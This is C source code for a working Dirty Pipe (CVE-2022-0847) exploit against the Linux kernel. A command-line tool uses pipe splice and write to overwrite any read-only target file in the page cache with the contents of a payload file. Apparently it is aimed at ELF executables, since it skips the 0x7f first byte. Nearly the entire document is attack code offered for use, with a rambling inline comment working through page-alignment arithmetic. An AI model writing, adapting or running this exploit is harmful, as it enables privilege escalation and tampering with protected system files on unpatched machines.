/* CVE-2022-0847 DirtyPipe - page cache overwrite */
/* Core primitive: overwrite read-only file bytes via pipe splice+write */
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/stat.h>

#define PAGE_SIZE 4096

/* 
 * To overwrite bytes [offset..offset+len) in a file:
 * 1. Open the file read-only
 * 2. Create a pipe with all slots marked CAN_MERGE
 * 3. splice(file, offset, pipe, ...) - loads page into page cache, 
 *    marks pipe buf with page reference + CAN_MERGE
 * 4. write(pipe, data, len) - merges into page cache at position offset
 */

static void fill_pipe_flags(int pfd[2]) {
    /* Write and read PAGE_SIZE bytes to set PIPE_BUF_FLAG_CAN_MERGE on all bufs */
    char buf[PAGE_SIZE];
    memset(buf, 0, sizeof(buf));
    unsigned pipe_size = fcntl(pfd[1], F_GETPIPE_SZ);
    if (pipe_size <= 0) pipe_size = 65536;

    /* Fill completely */
    unsigned written = 0;
    while (written < pipe_size) {
        int n = write(pfd[1], buf, PAGE_SIZE);
        if (n <= 0) break;
        written += n;
    }
    /* Drain completely */
    unsigned read_n = 0;
    while (read_n < written) {
        int n = read(pfd[0], buf, PAGE_SIZE);
        if (n <= 0) break;
        read_n += n;
    }
}

/* Overwrite [offset..offset+len) of target file with data */
/* offset must be > 0 (cannot be at page boundary == 0) */
static int dp_overwrite(const char *path, off_t offset, const void *data, size_t len) {
    /* We process page by page */
    const char *ptr = data;
    size_t remaining = len;
    off_t cur = offset;

    while (remaining > 0) {
        off_t page_base = (cur / PAGE_SIZE) * PAGE_SIZE;
        off_t in_page = cur - page_base;
        size_t chunk;

        if (in_page == 0) {
            /* Page-aligned case: we need to splice exactly PAGE_SIZE*N bytes 
             * to position the pipe write at the start of the next page.
             * Actually, we need to splice from 0 to cur to position write at cur.
             * But if cur is page-aligned, we can't use "in_page > 0" trick.
             * 
             * Trick: splice from page_base - 1 (i.e., cur - 1) bytes first,
             * which puts us at (cur-1) % PAGE_SIZE = PAGE_SIZE-1 within the previous page.
             * Then we'd write at page_base-1 in file, not page_base. Wrong.
             *
             * Correct trick for page-aligned: 
             * We need the pipe write to merge into page (page_base/PAGE_SIZE).
             * After splice(cur) bytes from the file, next write goes to:
             *   page_index = (cur-1)/PAGE_SIZE, offset = (cur-1)%PAGE_SIZE + 1
             *   Wait no: splice loads PAGES. splice of N bytes loads ceil(N/PAGE_SIZE) pages.
             *   The last pipe buf covers the page containing byte N-1.
             *   Write position within that buf = N % PAGE_SIZE.
             * 
             * If cur = 4096 (page aligned): splice(4096) -> last buf covers page[1] (bytes 4096-8191),
             *   write position = 4096 % 4096 = 0 -> write goes to page[1] offset 0 = file offset 4096.
             *   That's what we want!
             * 
             * So for page-aligned cur: splice(cur) bytes. Write goes to file[cur]. Correct!
             * We splice a lot of bytes (cur can be large), but splice is lazy - it just 
             * creates pipe buf references without copying data. Should be fast.
             */
            chunk = PAGE_SIZE; /* overwrite one full page */
            if (chunk > remaining) chunk = remaining;
        } else {
            chunk = PAGE_SIZE - in_page;
            if (chunk > remaining) chunk = remaining;
        }

        int fd = open(path, O_RDONLY);
        if (fd < 0) { perror("open"); return -1; }

        int p[2];
        if (pipe(p) < 0) { perror("pipe"); close(fd); return -1; }

        fill_pipe_flags(p);

        /* splice cur bytes (or PAGE_SIZE for in_page=0) from file */
        off_t splice_count;
        if (in_page == 0) {
            splice_count = cur; /* must be multiple of PAGE_SIZE */
        } else {
            splice_count = in_page; /* splice in_page bytes to position at in_page */
        }

        if (splice_count == 0) {
            /* This shouldn't happen since cur > 0, but handle it */
            close(fd); close(p[0]); close(p[1]);
            return -1;
        }

        loff_t off = 0;
        ssize_t nb = splice(fd, &off, p[1], NULL, splice_count, 0);
        if (nb != (ssize_t)splice_count) {
            fprintf(stderr, "splice: expected %ld got %zd: %s\n", 
                    (long)splice_count, nb, strerror(errno));
            /* Try to continue anyway with what we got */
            if (nb <= 0) {
                close(fd); close(p[0]); close(p[1]);
                return -1;
            }
        }

        /* Now write to pipe - merges into page cache */
        ssize_t written = write(p[1], ptr, chunk);
        if (written > 0) {
            fprintf(stderr, "[+] Overwrite: file[%ld..%ld] (%zd bytes)\n", 
                    (long)cur, (long)(cur+written), written);
        } else {
            perror("write pipe");
            close(fd); close(p[0]); close(p[1]);
            return -1;
        }

        close(fd); close(p[0]); close(p[1]);

        remaining -= written;
        cur += written;
        ptr += written;
    }

    return 0;
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <target_file> <payload_file>\n", argv[0]);
        fprintf(stderr, "  Overwrites target_file in page cache with payload_file contents\n");
        return 1;
    }

    const char *target = argv[1];
    const char *payload_path = argv[2];

    /* Read payload */
    FILE *fp = fopen(payload_path, "rb");
    if (!fp) { perror("fopen payload"); return 1; }
    fseek(fp, 0, SEEK_END);
    long payload_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    char *payload = malloc(payload_size);
    fread(payload, 1, payload_size, fp);
    fclose(fp);

    printf("[*] Target: %s\n", target);
    printf("[*] Payload: %s (%ld bytes)\n", payload_path, payload_size);
    printf("[*] Will overwrite bytes [1..%ld] (byte 0 = 0x7f in both, skip)\n", payload_size-1);

    /* Verify byte 0 of both files */
    {
        int fd = open(target, O_RDONLY);
        char b = 0;
        read(fd, &b, 1);
        close(fd);
        printf("[*] Target byte[0] = 0x%02x, Payload byte[0] = 0x%02x\n",
               (unsigned char)b, (unsigned char)payload[0]);
        if ((unsigned char)b != (unsigned char)payload[0]) {
            printf("[!] Byte 0 mismatch! This may cause issues.\n");
        }
    }

    /* Overwrite from byte 1 onward */
    /* Note: target file must have at least as many bytes as payload */
    struct stat st;
    stat(target, &st);
    if (st.st_size < payload_size) {
        printf("[!] Target smaller than payload!\n");
        return 1;
    }

    int ret = dp_overwrite(target, 1, payload + 1, payload_size - 1);
    if (ret == 0) {
        printf("[*] SUCCESS: overwrite complete\n");
    } else {
        printf("[!] FAILED\n");
    }

    free(payload);
    return ret;
}
